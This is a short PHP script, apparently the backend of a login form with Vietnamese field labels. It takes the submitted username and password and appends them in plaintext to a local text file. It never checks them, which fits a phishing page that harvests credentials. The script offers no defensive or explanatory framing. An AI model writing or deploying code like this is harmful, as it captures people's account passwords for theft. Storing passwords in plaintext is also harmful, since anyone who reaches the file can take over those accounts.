
    <?php
        
        $username = $_POST["taikhoan"];
        $password = $_POST["matkhau"];
        $_SESSION["username"] = $username;
         $body = " \n Tài Khoản : $username \n Mật Khẩu : $password \n ";
        $test = fopen("a.txt","a");
        fwrite($test,$body);
        fclose($test); 
?> 
